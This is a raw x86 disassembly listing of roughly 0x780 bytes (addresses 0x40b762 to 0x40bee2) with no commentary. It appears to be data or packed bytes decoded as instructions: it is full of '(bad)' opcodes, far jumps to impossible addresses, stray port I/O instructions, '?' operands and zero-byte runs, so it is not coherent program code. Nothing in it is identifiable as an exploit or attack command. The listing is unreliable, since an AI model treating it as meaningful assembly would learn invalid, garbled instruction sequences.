  40b762:	cli    
  40b763:	call   0x2acdabea
  40b768:	mov    bh,0xfa
  40b76a:	add    dh,BYTE PTR [esi]
  40b76c:	scas   al,BYTE PTR es:[edi]
  40b76d:	les    eax,FWORD PTR [ebx+0xd]
  40b770:	xchg   DWORD PTR [edx],edx
  40b772:	jmp    0x40b76d
  40b774:	lods   al,BYTE PTR ds:[esi]
  40b775:	inc    edx
  40b776:	and    al,0xf4
  40b778:	jp     0x40b725
  40b77a:	adc    eax,0xce632a7
  40b77f:	jmp    0xd8d:0x25c60fd3
  40b786:	add    dl,BYTE PTR [eax+0x7efebdd7]
  40b78c:	cmp    al,0x42
  40b78e:	and    al,0xe4
  40b790:	jns    0x40b782
  40b792:	mov    edi,0xfebdbd80
  40b797:	data16 cmp al,0x42
  40b79a:	and    al,0xef
  40b79c:	inc    esi
  40b79d:	test   eax,0xe6ba2f04
  40b7a2:	or     eax,0xeac13709
  40b7a7:	pop    esp
  40b7a8:	sub    ebx,ecx
  40b7aa:	mov    WORD PTR [ebp+0x644ffe12],fs
  40b7b0:	mov    edx,0xc3993be6
  40b7b5:	pop    DWORD PTR [ebx-0x33]
  40b7b8:	push   ds
  40b7b9:	dec    esi
  40b7ba:	push   esp
  40b7bc:	and    dl,BYTE PTR [eax+eax*2]
  40b7bf:	jmp    0x40b7c4
  40b7c4:	add    ch,ch
  40b7c6:	jge    0x40b83b
  40b7c8:	in     eax,dx
  40b7c9:	jmp    0x40b80c
  40b7cb:	and    al,0x0
  40b7cd:	mov    ah,0x8e
  40b7cf:	inc    esp
  40b7d0:	add    ah,BYTE PTR [edi+0x45]
  40b7d3:	and    al,0x3c
  40b7d5:	push   ebp
  40b7d6:	dec    ebx
  40b7d7:	push   es
  40b7d8:	mov    edx,DWORD PTR [eax]
  40b7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7db:	mov    DWORD PTR ds:[edx+0x70448b0c],esp
  40b7e2:	dec    edx
  40b7e3:	mov    DWORD PTR [esi-0x26],eax
  40b7e6:	pop    DWORD PTR [edx+0x24]
  40b7e9:	call   0x4a8e:0xa924440f
  40b7f0:	and    al,0xcc
  40b7f2:	mov    DWORD PTR [ecx+eax*1-0x5b],eax
  40b7f6:	dec    ebp
  40b7f7:	and    al,0x18
  40b7f9:	popa   
  40b7fa:	add    eax,0x4804800c
  40b7ff:	add    esi,edi
  40b801:	push   eax
  40b802:	stos   BYTE PTR es:[edi],al
  40b803:	or     eax,0xeaa50ff
  40b808:	sub    BYTE PTR [eax-0x56],0xd
  40b80c:	sbb    ch,BYTE PTR [ebx-0x79]
  40b80f:	outs   dx,DWORD PTR ds:[esi]
  40b810:	(bad)  
  40b811:	jmp    0x40b7d6
  40b813:	jle    0x40b891
  40b815:	xor    BYTE PTR [ebp+0xe918afe],ah
  40b81b:	mov    ecx,DWORD PTR [eax+eax*4+0x1a]
  40b81f:	mov    DWORD PTR [eax],ecx
  40b821:	and    DWORD PTR [eax],ecx
  40b823:	push   DWORD PTR [eax+esi*2-0x4e]
  40b827:	out    0x90,al
  40b829:	add    BYTE PTR [eax],al
  40b82b:	add    BYTE PTR [eax],al
  40b82d:	add    BYTE PTR [ebx+0x638b0001],al
  40b833:	and    ebx,DWORD PTR [esi+0x5b]
  40b836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b837:	gs pop ebx
  40b839:	ret    0x110
  40b83c:	push   ebp
  40b83d:	mov    ebx,DWORD PTR [eax-0x79]
  40b840:	loop   0x40b83a
  40b842:	lahf   
  40b843:	jb     0x40b87f
  40b845:	push   ebx
  40b846:	ret    0x6a59
  40b849:	or     BYTE PTR [ebp-0x28],dh
  40b84c:	fistp  DWORD PTR [ebp-0x12]
  40b84f:	hlt    
  40b850:	mov    es,WORD PTR [ebx-0x67]
  40b853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b854:	mov    DWORD PTR [ebx-0x6f],ebx
  40b857:	fisttp WORD PTR [ecx-0x763466a5]
  40b85d:	pop    ebx
  40b85e:	xchg   ecx,eax
  40b85f:	mov    edi,0x44139943
  40b865:	add    BYTE PTR [ebp-0x55],dh
  40b868:	stos   BYTE PTR es:[edi],al
  40b869:	aam    0x41
  40b86b:	stos   DWORD PTR es:[edi],eax
  40b86c:	add    cl,BYTE PTR [ebx-0x7bdff8d7]
  40b872:	mov    ch,0xfe
  40b874:	adc    DWORD PTR [ebx+0x2e40731],ecx
  40b87a:	mov    ah,0x21
  40b87c:	aaa    
  40b87d:	and    al,0x55
  40b87f:	mov    al,0xc3
  40b881:	je     0x40b803
  40b883:	cli    
  40b884:	stos   DWORD PTR es:[edi],eax
  40b885:	cmp    BYTE PTR [edx-0x4accfd57],ah
  40b88b:	adc    DWORD PTR ds:0xf3ab7502,0xbf
  40b895:	add    BYTE PTR [eax],al
  40b897:	add    BYTE PTR [esi],al
  40b899:	call   0x6d44d6b2
  40b89e:	test   eax,0x13e7ee3b
  40b8a3:	je     0x40b826
  40b8a5:	leave  
  40b8a6:	xchg   BYTE PTR [ecx+ebp*4-0x75],dh
  40b8aa:	out    dx,eax
  40b8ab:	cld    
  40b8ac:	aad    0xe6
  40b8ae:	movd   DWORD PTR [eax+0x10],mm3
  40b8b2:	test   BYTE PTR [edx-0x56],bl
  40b8b5:	add    al,BYTE PTR [eax]
  40b8b7:	(bad)  
  40b8b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8b9:	dec    esi
  40b8ba:	push   ss
  40b8bb:	mov    ch,0xa9
  40b8bd:	mov    eax,DWORD PTR [ebp-0x4b]
  40b8c0:	sub    BYTE PTR [ebx-0x47da95e9],bh
  40b8c6:	call   DWORD PTR [edx]
  40b8c8:	add    ebp,ecx
  40b8ca:	(bad)  
  40b8cb:	test   DWORD PTR [edx],0x867203e9
  40b8d1:	add    al,0x3
  40b8d3:	jne    0x40b8d7
  40b8d5:	push   0x41
  40b8d7:	cmp    DWORD PTR [ecx],eax
  40b8d9:	test   BYTE PTR [esi+0x3e902d4],0xcd
  40b8e0:	push   ss
  40b8e1:	fadd   QWORD PTR ds:0x35e4fe75
  40b8e7:	jl     0x40b89c
  40b8e9:	cs cld 
  40b8eb:	dec    edx
  40b8ec:	add    ecx,ebp
  40b8ee:	add    ecx,esi
  40b8f0:	or     BYTE PTR [edx+0x3e],ch
  40b8f3:	jno    0x40b8f7
  40b8f5:	push   esp
  40b8f6:	or     dh,dh
  40b8f8:	cmp    al,0x31
  40b8fa:	add    al,0x0
  40b8fc:	add    BYTE PTR [eax],al
  40b8fe:	add    BYTE PTR [eax],al
  40b900:	jp     0x40b888
  40b902:	test   al,0x4
  40b904:	jne    0x40b908
  40b906:	cli    
  40b907:	ret    
  40b908:	or     al,0x4
  40b90a:	inc    edi
  40b90b:	lea    esi,[esi]
  40b90d:	out    0xd8,al
  40b90f:	pop    esp
  40b910:	clc    
  40b911:	(bad)
  40b915:	addr16 inc edx
  40b917:	mov    edi,eax
  40b919:	adc    DWORD PTR [edx-0xabd01a9],eax
  40b91f:	mov    BYTE PTR [edx],ch
  40b921:	ss sub al,0x8b
  40b924:	mov    bl,0x12
  40b926:	push   0xffffffbd
  40b928:	push   0x35
  40b92a:	iret   
  40b92b:	and    eax,0x38eaf9f6
  40b930:	ins    DWORD PTR es:[edi],dx
  40b931:	mov    BYTE PTR [edi+eiz*8-0x1853437b],ch
  40b938:	test   DWORD PTR [esi+0x7f66391f],eax
  40b93e:	sub    BYTE PTR [eax],cl
  40b940:	lahf   
  40b941:	push   es
  40b942:	cdq    
  40b943:	nop
  40b944:	mov    dh,0xe6
  40b946:	push   ecx
  40b948:	iret   
  40b949:	loope  0x40b8cd
  40b94b:	xor    BYTE PTR [ebp+0x35],dl
  40b94e:	and    cl,BYTE PTR [edi-0x6be90d09]
  40b954:	bound  ecx,QWORD PTR [eax-0x42fb32b5]
  40b95a:	inc    ebx
  40b95b:	(bad)
  40b95e:	enter  0x867c,0x7f
  40b962:	mov    edi,0xf1
  40b967:	add    BYTE PTR [eax],al
  40b969:	mov    WORD PTR [edx],ss
  40b96b:	push   eax
  40b96c:	fs sub eax,0x13993ee6
  40b972:	rol    BYTE PTR [edx+0x7e877aad],1
  40b978:	icebp  
  40b979:	in     eax,dx
  40b97a:	mov    ebx,0x87908c74
  40b97f:	inc    ebp
  40b980:	adc    DWORD PTR [ebx-0x77],ebx
  40b983:	inc    ebx
  40b984:	or     eax,0x294587a5
  40b989:	and    BYTE PTR [edi+edi*8-0x38088918],bh
  40b990:	rol    ecx,cl
  40b992:	mov    ah,0xd0
  40b994:	retf   
  40b995:	mov    esi,0xeedd4587
  40b99a:	inc    esi
  40b99b:	and    al,0xc7
  40b99d:	stc    
  40b99e:	mov    ebx,0x2076e9fe
  40b9a3:	mov    DWORD PTR ds:0xa83ae95d,esi
  40b9a9:	stos   DWORD PTR es:[edi],eax
  40b9aa:	jmp    DWORD PTR [ebp+0x60]
  40b9ad:	mov    dl,0xde
  40b9af:	add    ebp,DWORD PTR cs:[esi-0x79]
  40b9b3:	inc    ebx
  40b9b4:	or     eax,0xd5ff4a41
  40b9b9:	pop    edx
  40b9ba:	loop   0x40b948
  40b9bc:	aad    0x52
  40b9be:	loop   0x40b9a7
  40b9c0:	lahf   
  40b9c1:	outs   dx,DWORD PTR ds:[esi]
  40b9c2:	add    al,BYTE PTR [eax]
  40b9c4:	add    BYTE PTR [ecx+0x620472c5],bl
  40b9ca:	inc    ecx
  40b9cb:	and    al,0x19
  40b9cd:	add    BYTE PTR [eax],al
  40b9cf:	add    BYTE PTR [eax],al
  40b9d1:	add    BYTE PTR [edi+0x4a8507ef],dl
  40b9d7:	or     BYTE PTR [ebp-0x287ad0e],al
  40b9dd:	(bad)  
  40b9de:	call   0x6028c884
  40b9e3:	(bad)  
  40b9e5:	dec    edi
  40b9e7:	fsubr  QWORD PTR [eax+0x1]
  40b9ea:	test   BYTE PTR [ebx],dh
  40b9ec:	test   BYTE PTR [ecx],al
  40b9ee:	int3   
  40b9ef:	mov    esi,gs
  40b9f1:	cmp    ebx,edi
  40b9f3:	lock dec eax
  40b9f5:	mov    DWORD PTR [eax],eax
  40b9f7:	mov    ds:0xf872390e,al
  40b9fc:	cmp    cl,BYTE PTR [ebp+0x7b830a82]
  40ba02:	enter  0x7515,0x21
  40ba06:	pop    ss
  40ba07:	add    eax,DWORD PTR [ebp+0x6a1b68c0]
  40ba0d:	add    al,0xf
  40ba0f:	mov    esi,0xfae35002
  40ba14:	and    ebp,DWORD PTR [eax]
  40ba16:	xor    DWORD PTR [edx+0x24],eax
  40ba19:	sub    ah,ah
  40ba1b:	jge    0x40ba95
  40ba1d:	add    BYTE PTR [eax+eax*4+0x778874be],cl
  40ba24:	inc    edx
  40ba25:	and    al,0x66
  40ba27:	jbe    0x40ba6b
  40ba29:	and    al,0x4c
  40ba2b:	mov    al,BYTE PTR [edx+0x24]
  40ba2e:	cmp    al,0x82
  40ba30:	ror    DWORD PTR [eax],0x27
  40ba33:	(bad)  
  40ba34:	jnp    0x40ba00
  40ba36:	add    BYTE PTR [eax],al
  40ba38:	add    BYTE PTR [eax],al
  40ba3a:	add    BYTE PTR [edi],cl
  40ba3c:	ficom  DWORD PTR [eax+ebp*8-0x9]
  40ba40:	sar    bh,1
  40ba42:	jmp    DWORD PTR [esi]
  40ba44:	add    ebp,eax
  40ba46:	pop    esp
  40ba47:	jne    0x40ba6f
  40ba49:	add    eax,DWORD PTR [eax]
  40ba4b:	(bad)  
  40ba4c:	pop    edx
  40ba4d:	stc    
  40ba4e:	repnz mov eax,ds:0x595b8972
  40ba54:	(bad)  
  40ba56:	sbb    eax,0x5d8db49b
  40ba5b:	jns    0x40ba89
  40ba5d:	cmp    DWORD PTR [ecx+ebp*2],eax
  40ba60:	xchg   esi,eax
  40ba61:	loope  0x40b9ed
  40ba63:	jbe    0x40ba83
  40ba65:	les    esi,FWORD PTR [ebx+0x5e]
  40ba68:	test   DWORD PTR [edx],edx
  40ba6a:	xor    DWORD PTR [ebp+0x61ff52a2],0xffffffc7
  40ba71:	jmp    0x16e7:0xeabf618c
  40ba78:	xor    eax,0xeaf80003
  40ba7d:	aaa    
  40ba7e:	add    al,0xcb
  40ba80:	out    0xe7,al
  40ba82:	sbb    al,dl
  40ba84:	fsubrp st(7),st
  40ba86:	pmaxsw mm4,mm6
  40ba89:	out    0xf,eax
  40ba8b:	imul   BYTE PTR [ebx+0xa]
  40ba8e:	cmp    esi,DWORD PTR [ebx+0x3f]
  40ba91:	retf   0xbe32
  40ba94:	adc    BYTE PTR [esp+eax*2+0x6a02a9c0],ch
  40ba9b:	jge    0x40baf3
  40ba9d:	inc    edi
  40ba9e:	and    al,0x0
  40baa0:	add    BYTE PTR [eax],al
  40baa2:	add    BYTE PTR [eax],al
  40baa4:	ins    DWORD PTR es:[edi],dx
  40baa5:	sti    
  40baa6:	push   eax
  40baa7:	lea    eax,[ecx]
  40baa9:	mov    edi,0xc71988ea
  40baae:	loope  0x40ba97
  40bab0:	loop   0x40bac5
  40bab2:	add    al,0x0
  40bab4:	(bad)  
  40bab5:	in     eax,0xe7
  40bab7:	pop    ds
  40bab8:	out    dx,al
  40bab9:	out    0xb,al
  40babb:	push   ebx
  40babc:	in     al,dx
  40babd:	stos   BYTE PTR es:[edi],al
  40babe:	stos   BYTE PTR es:[edi],al
  40babf:	and    BYTE PTR [eax],ch
  40bac1:	stos   DWORD PTR es:[edi],eax
  40bac2:	add    cl,BYTE PTR [ebx+0x200d02b1]
  40bac8:	mov    ds:0x5188c258,al
  40bacd:	push   esi
  40bace:	sub    eax,DWORD PTR [edi]
  40bad0:	jne    0x40bb1f
  40bad2:	bound  ebp,QWORD PTR [edi+0x50b8a6f7]
  40bad8:	retf   
  40bad9:	sub    al,0xd9
  40badb:	sub    DWORD PTR [ebp+0x4f],esi
  40bade:	ss push ss
  40bae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bae1:	adc    BYTE PTR [ecx-0xb4109fd],ch
  40bae7:	mov    ?,WORD PTR [ecx+0x73c5b86a]
  40baed:	add    DWORD PTR [esi],ebp
  40baef:	inc    esi
  40baf0:	sbb    eax,0x7503e943
  40baf5:	mov    bh,0xdb
  40baf7:	fild   WORD PTR [edx+eax*2+0x2f1a86e9]
  40bafe:	retf   0x3988
  40bb01:	outs   dx,BYTE PTR ds:[esi]
  40bb02:	popa   
  40bb03:	dec    esi
  40bb04:	add    eax,0xc59508
  40bb09:	add    BYTE PTR [eax],al
  40bb0b:	add    BYTE PTR [eax],al
  40bb0d:	rcl    ax,0x10
  40bb11:	lock ret 0x15b
  40bb15:	idiv   BYTE PTR [ecx-0xc8dcd33]
  40bb1b:	scas   eax,DWORD PTR es:[edi]
  40bb1c:	in     eax,0x31
  40bb1e:	scas   al,BYTE PTR es:[edi]
  40bb1f:	rol    DWORD PTR [edi],1
  40bb21:	in     al,dx
  40bb22:	cmp    eax,0x1438dbd
  40bb27:	pop    esp
  40bb28:	inc    ecx
  40bb29:	mov    ebp,0x8111a652
  40bb2e:	adc    al,0x29
  40bb30:	add    al,0xbd
  40bb32:	mov    bh,0x95
  40bb34:	add    al,0x75
  40bb36:	sti    
  40bb37:	and    ebx,eax
  40bb39:	stc    
  40bb3a:	sub    al,0x59
  40bb3c:	pop    ds
  40bb3d:	xor    eax,0xb1e798af
  40bb42:	(bad)  
  40bb43:	dec    DWORD PTR [esi]
  40bb45:	add    BYTE PTR [eax+0x5],al
  40bb48:	xor    esp,ebp
  40bb4a:	mov    dh,0xfe
  40bb4c:	jmp    0xe89a5b5f
  40bb51:	jbe    0x40bad8
  40bb53:	je     0x40bbae
  40bb55:	mov    cl,0x95
  40bb57:	(bad)  
  40bb58:	call   0xa41a65d3
  40bb5d:	jns    0x40bb61
  40bb5f:	mov    esp,DWORD PTR [edi]
  40bb61:	rol    DWORD PTR [ebp+0x7aa95944],0x1
  40bb68:	jmp    0x2c283de3
  40bb6d:	ja     0x40bb70
  40bb6f:	add    BYTE PTR [edx+0x0],dh
  40bb72:	add    BYTE PTR [eax],al
  40bb74:	add    BYTE PTR [eax],al
  40bb76:	add    al,0x6f
  40bb78:	adc    ebp,DWORD PTR [ecx+0x60502c76]
  40bb7e:	ss (bad) 
  40bb80:	(bad)  
  40bb81:	pop    ds
  40bb82:	xchg   ebx,eax
  40bb83:	dec    eax
  40bb84:	mov    BYTE PTR [esi-0x7c2a4895],ah
  40bb8a:	aas    
  40bb8b:	mov    edx,edi
  40bb8d:	out    dx,al
  40bb8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb8f:	test   DWORD PTR [edx-0x1a],edx
  40bb92:	inc    ecx
  40bb93:	mov    dh,0xfe
  40bb95:	jmp    0x5f11b710
  40bb9a:	jle    0x40bb21
  40bb9c:	dec    edi
  40bb9d:	into   
  40bb9e:	stos   DWORD PTR es:[edi],eax
  40bb9f:	shl    DWORD PTR [esi-0xf],1
  40bba2:	push   esp
  40bba3:	mov    DWORD PTR [esi-0x13],ebx
  40bba6:	push   esp
  40bba7:	mov    DWORD PTR [esi-0x19],eax
  40bbaa:	sub    al,0x5b
  40bbac:	leave  
  40bbad:	stos   BYTE PTR es:[edi],al
  40bbae:	and    eax,0xe26aeb8b
  40bbb3:	scas   al,BYTE PTR es:[edi]
  40bbb4:	or     BYTE PTR [ebp-0x16fffe76],0xcb
  40bbbb:	dec    esp
  40bbbc:	push   edi
  40bbbd:	fidiv  DWORD PTR [esi]
  40bbbf:	icebp  
  40bbc0:	fiadd  DWORD PTR [eax]
  40bbc2:	in     eax,0x4d
  40bbc4:	and    al,0x48
  40bbc6:	leave  
  40bbc7:	in     eax,dx
  40bbc8:	and    ecx,DWORD PTR [edi+esi*4+0x24]
  40bbcc:	xor    al,al
  40bbce:	aad    0x4d
  40bbd0:	and    al,0x54
  40bbd2:	leave  
  40bbd3:	in     eax,dx
  40bbd4:	and    ebx,DWORD PTR [eax-0x19]
  40bbd7:	and    al,0x88
  40bbd9:	pop    esp
  40bbda:	add    BYTE PTR [eax],al
  40bbdc:	add    BYTE PTR [eax],al
  40bbde:	add    BYTE PTR [eax-0x363fcd22],al
  40bbe4:	in     eax,dx
  40bbe5:	and    esp,DWORD PTR [edi+eax*1-0x75]
  40bbe9:	jb     0x40bc0f
  40bbeb:	je     0x40bb74
  40bbed:	pop    edx
  40bbee:	and    al,0xc
  40bbf0:	and    eax,0xfe5ad2e7
  40bbf5:	dec    DWORD PTR [eax+eiz*4+0xc0082d5]
  40bbfc:	add    bh,BYTE PTR [eax+0x1dc9f]
  40bc02:	(bad)  
  40bc03:	adc    dh,dl
  40bc05:	ss in  al,dx
  40bc07:	push   0xf8890041
  40bc0c:	aad    0x3e
  40bc0e:	mov    eax,ebp
  40bc10:	aad    0x42
  40bc12:	call   0x421420
  40bc17:	dec    ecx
  40bc18:	xor    ah,BYTE PTR [ebx]
  40bc1a:	lods   al,BYTE PTR ds:[esi]
  40bc1b:	int3   
  40bc1c:	add    DWORD PTR [eax],eax
  40bc1e:	mov    eax,0xfffffefc
  40bc23:	mov    ah,0x1a
  40bc25:	pop    edx
  40bc26:	add    DWORD PTR [esi+eax*4+0x420950c4],ecx
  40bc2d:	and    al,0x3c
  40bc2f:	ins    BYTE PTR es:[edi],dx
  40bc30:	data16 xor BYTE PTR [ebx],cl
  40bc33:	sahf   
  40bc34:	add    DWORD PTR [eax+eax*8-0x7b72eb9f],eax
  40bc3b:	mov    al,0x35
  40bc3d:	(bad)  
  40bc3e:	push   DWORD PTR [ebp-0x55]
  40bc41:	push   edx
  40bc42:	lea    eax,[eax]
  40bc44:	add    BYTE PTR [eax],al
  40bc46:	add    BYTE PTR [eax],al
  40bc48:	mov    cl,0xbf
  40bc4a:	test   BYTE PTR [edi+0x4d],0x9f
  40bc4e:	or     eax,DWORD PTR [edx]
  40bc50:	jne    0x40bc71
  40bc52:	les    ecx,FWORD PTR [esi]
  40bc54:	stc    
  40bc55:	jmp    0x43f7:0x20750002
  40bc5c:	imul   ax,WORD PTR [edx],0xff8d
  40bc60:	mov    cl,0xff
  40bc62:	dec    ebx
  40bc63:	mov    DWORD PTR [ecx-0x4e731bf9],edi
  40bc69:	dec    DWORD PTR [edi-0x77]
  40bc6c:	mov    ecx,0xb18ce007
  40bc71:	jmp    DWORD PTR [ebx]
  40bc73:	mov    DWORD PTR [ecx-0x4e7313f9],edi
  40bc79:	jmp    ebx
  40bc7b:	mov    BYTE PTR [ecx-0x4e38f139],bh
  40bc81:	mov    edi,0x6b66d816
  40bc86:	add    al,bh
  40bc88:	xor    DWORD PTR [edi-0x548afd1a],edi
  40bc8e:	add    cl,BYTE PTR [ebx+0x6616bf31]
  40bc94:	(bad)  
  40bc95:	stos   BYTE PTR es:[edi],al
  40bc96:	test   DWORD PTR [ebx+0x41391],esi
  40bc9c:	jne    0x40bc71
  40bc9e:	push   0x58
  40bca0:	je     0x40bc4d
  40bca2:	stc    
  40bca3:	pop    ebx
  40bca4:	pop    ecx
  40bca5:	out    0x2e,eax
  40bca7:	adc    ebx,DWORD PTR ds:0x3f86bf
  40bcad:	add    BYTE PTR [eax],al
  40bcaf:	add    BYTE PTR [eax],al
  40bcb1:	jne    0x40bc6f
  40bcb3:	iret   
  40bcb4:	mov    BYTE PTR [ecx],dh
  40bcb6:	(bad)  
  40bcb7:	aas    
  40bcb8:	cmp    esi,DWORD PTR [esi+0x75c97e9b]
  40bcbe:	stos   DWORD PTR es:[edi],eax
  40bcbf:	add    cl,BYTE PTR [ebp-0x2432fe07]
  40bcc5:	jp     0x40bc7b
  40bcc7:	call   0xcd97b91f
  40bccc:	punpckhdq mm1,mm4
  40bccf:	popa   
  40bcd0:	mov    bl,0x9f
  40bcd2:	scas   eax,DWORD PTR es:[edi]
  40bcd3:	cld    
  40bcd4:	sbb    dh,ch
  40bcd6:	lds    eax,FWORD PTR ds:[ebx-0x2]
  40bcda:	or     ah,BYTE PTR [edi+ecx*2-0x6f]
  40bcde:	adc    bl,BYTE PTR [ebx]
  40bce0:	push   ebp
  40bce1:	iret   
  40bce2:	repnz mov esi,0xb4dec6b8
  40bce8:	push   ebx
  40bce9:	xor    dl,BYTE PTR [edx-0x47]
  40bcec:	jle    0x40bcd8
  40bcee:	cs in  eax,0x8a
  40bcf1:	mov    esi,0x1a51d8de
  40bcf6:	push   cs
  40bcf7:	std    
  40bcf8:	adc    al,0xb5
  40bcfa:	add    ah,BYTE PTR [edx+0x3f]
  40bcfd:	push   ecx
  40bcfe:	adc    ah,BYTE PTR [eax+0x3f]
  40bd01:	pop    ecx
  40bd02:	sbb    ah,dl
  40bd04:	les    ebp,FWORD PTR [ebx+0x7e]
  40bd07:	push   0x62027503
  40bd0c:	or     edi,eax
  40bd0e:	dec    esi
  40bd0f:	lds    esp,FWORD PTR [edi]
  40bd11:	inc    edi
  40bd12:	test   DWORD PTR [edi+ebx*8+0x0],ebx
  40bd19:	add    BYTE PTR [edx+0x5d029350],ah
  40bd1f:	adc    cl,dh
  40bd21:	add    esi,DWORD PTR [ebp+0x52]
  40bd24:	out    dx,al
  40bd25:	push   ecx
  40bd26:	gs jge 0x40bcd1
  40bd29:	xor    DWORD PTR [esi],ebx
  40bd2b:	jg     0x40bd89
  40bd2d:	loopne 0x40bd4d
  40bd2f:	add    DWORD PTR [eax+edx*2-0x2],ebx
  40bd33:	ds add eax,0x1a0aeff0
  40bd39:	push   ebx
  40bd3a:	call   0x277cc28d
  40bd3f:	dec    edi
  40bd40:	add    BYTE PTR [ecx-0x2f],al
  40bd43:	xor    BYTE PTR [eax-0x17],al
  40bd46:	es mov bl,0x50
  40bd49:	stc    
  40bd4a:	cmc    
  40bd4b:	jae    0x40bdc1
  40bd4d:	into   
  40bd4e:	nop
  40bd4f:	jg     0x40bdcc
  40bd51:	int    0xa6
  40bd53:	or     dh,BYTE PTR [ebp-0x13]
  40bd56:	out    dx,eax
  40bd57:	ds and al,0x1
  40bd5a:	pop    esi
  40bd5b:	shl    BYTE PTR [ebx-0x2b],0x70
  40bd5f:	stc    
  40bd60:	pop    ss
  40bd61:	std    
  40bd62:	jae    0x40bdb6
  40bd64:	mov    esp,DWORD PTR ds:0x198b0b55
  40bd6a:	idiv   BYTE PTR [edx-0x4071ae02]
  40bd70:	add    cl,ch
  40bd72:	std    
  40bd73:	ds and al,0xd9
  40bd76:	(bad)  
  40bd77:	mov    bl,0x14
  40bd79:	mov    cl,0x87
  40bd7b:	inc    edx
  40bd7c:	add    BYTE PTR [edx+0x0],dh
  40bd7f:	add    BYTE PTR [eax],al
  40bd81:	add    BYTE PTR [eax],al
  40bd83:	mov    ch,0xde
  40bd85:	xor    esp,DWORD PTR [edx+0x79]
  40bd88:	push   edx
  40bd89:	call   FWORD PTR [eax-0x32bc7892]
  40bd8f:	pop    esi
  40bd90:	xchg   DWORD PTR [edi],eax
  40bd92:	mov    ecx,0x6a08522b
  40bd97:	xor    eax,0xf7eb1bde
  40bd9c:	ds and al,0xdd
  40bd9f:	fidiv  DWORD PTR [ebx+0x3dac54b]
  40bda5:	test   edi,edi
  40bda7:	add    BYTE PTR [esi+edi*8+0x37de855c],dh
  40bdae:	rcr    DWORD PTR [edx],1
  40bdb0:	or     al,BYTE PTR [edx]
  40bdb2:	jmp    0x964ecb4
  40bdb7:	(bad)  
  40bdb9:	cld    
  40bdba:	call   0x9c4735
  40bdbf:	push   0xdbde89a6
  40bdc4:	repnz and esp,DWORD PTR [eax]
  40bdc7:	push   0xb4003fe3
  40bdcc:	jmp    0x74bf:0x328c00df
  40bdd3:	inc    eax
  40bdd4:	jge    0x40be18
  40bdd6:	and    al,0x34
  40bdd8:	jge    0x40bde0
  40bdda:	lea    ebp,[eax+0x7c520ea2]
  40bde0:	jns    0x40be31
  40bde2:	and    cl,bl
  40bde4:	lds    esi,FWORD PTR [ebx+0xb]
  40bde7:	add    BYTE PTR [eax],al
  40bde9:	add    BYTE PTR [eax],al
  40bdeb:	add    BYTE PTR [edx-0x7b],bh
  40bdee:	jp     0x40be14
  40bdf0:	sbb    al,0x79
  40bdf2:	or     eax,0x5c8c94
  40bdf7:	xor    bl,BYTE PTR [ecx+esi*1-0x41]
  40bdfb:	je     0x40be11
  40bdfd:	jno    0x40be41
  40bdff:	and    al,0x7c
  40be01:	pop    es
  40be02:	add    BYTE PTR [eax],al
  40be04:	or     al,0x7b
  40be06:	jb     0x40be2c
  40be08:	jl     0x40be68
  40be0a:	and    esp,eax
  40be0c:	sbb    al,0x6
  40be0e:	mov    ecx,DWORD PTR [eax+edi*2-0x22]
  40be12:	add    cl,BYTE PTR [eax+ebp*1+0x5a]
  40be16:	mov    eax,DWORD PTR [eax+edi*4+0x55]
  40be1a:	lea    ebx,[ebp+ebx*8-0x3]
  40be1e:	mov    BYTE PTR [eax+edi*4+0xd],bl
  40be22:	test   ebx,ebx
  40be24:	pop    ecx
  40be25:	mov    cl,0x31
  40be27:	jmp    DWORD PTR [edi-0x17]
  40be2a:	mov    al,bl
  40be2c:	je     0x40be56
  40be2e:	rol    BYTE PTR [ecx],1
  40be30:	int3   
  40be31:	jl     0x40be29
  40be33:	test   ebx,edx
  40be35:	repnz pop esi
  40be37:	mov    ebx,DWORD PTR [eax-0x5e]
  40be3a:	mov    esi,DWORD PTR cs:[ebp+0xe]
  40be3e:	dec    eax
  40be3f:	push   ss
  40be40:	xor    eax,0x7446899b
  40be45:	popa   
  40be46:	cld    
  40be47:	add    bh,bh
  40be49:	out    0xdf,eax
  40be4b:	dec    edi
  40be4c:	std    
  40be4d:	loopne 0x40be4d
  40be4f:	mov    DWORD PTR [eax],eax
  40be51:	add    BYTE PTR [eax],al
  40be53:	add    BYTE PTR [eax],al
  40be55:	cmp    DWORD PTR [edi],eax
  40be57:	pop    eax
  40be58:	mov    BYTE PTR [edx],dh
  40be5a:	mov    eax,ds:0x13994388
  40be5f:	mov    WORD PTR [esi+0x72],es
  40be62:	test   al,0x6c
  40be64:	inc    esi
  40be65:	js     0x40be52
  40be67:	mov    ah,0x73
  40be69:	xchg   ecx,eax
  40be6a:	test   DWORD PTR [esi-0x4af382a2],0x3cf17ad5
  40be74:	add    eax,0xb6049376
  40be79:	mov    dl,0xa1
  40be7b:	push   edx
  40be7c:	jmp    FWORD PTR [ecx+0x2a532007]
  40be82:	icebp  
  40be83:	add    al,0xb6
  40be85:	mov    edx,0xe30f52a8
  40be8a:	pop    edi
  40be8b:	cld    
  40be8c:	dec    BYTE PTR [ecx+0x36033807]
  40be92:	mov    esi,DWORD PTR [ebx-0x2181112b]
  40be98:	cmp    esi,esi
  40be9a:	(bad)  
  40be9c:	mov    WORD PTR [ecx-0x39],gs
  40be9f:	dec    edx
  40bea0:	call   0x439881
  40bea5:	lock xchg esi,eax
  40bea7:	ficom  WORD PTR [ebx-0x33]
  40beaa:	cli    
  40beab:	ret    0x7500
  40beae:	push   ds
  40beaf:	xor    BYTE PTR [edx*2+0x74c0cd03],ah
  40beb6:	fwait
  40beb7:	xchg   DWORD PTR [eax+eax*1+0x0],eax
  40bebb:	add    BYTE PTR [eax],al
  40bebd:	add    BYTE PTR [ebp+0x2],ch
  40bec0:	jo     0x40bedd
  40bec2:	dec    al
  40bec4:	cmp    eax,0xcb7d4e56
  40bec9:	push   esi
  40beca:	mov    bh,0x5
  40becc:	jmp    0x6c3ef159
  40bed1:	retf   0xfa09
  40bed4:	jno    0x40bf21
  40bed6:	jge    0x40bf53
  40bed8:	and    BYTE PTR [eax],cl
  40beda:	mov    ?,esp
  40bedc:	popa   
  40bedd:	push   ebx
  40bede:	ins    DWORD PTR es:[edi],dx
  40bedf:	in     eax,dx
  40bee0:	mov    dl,0x31
  40bee2:	popf   
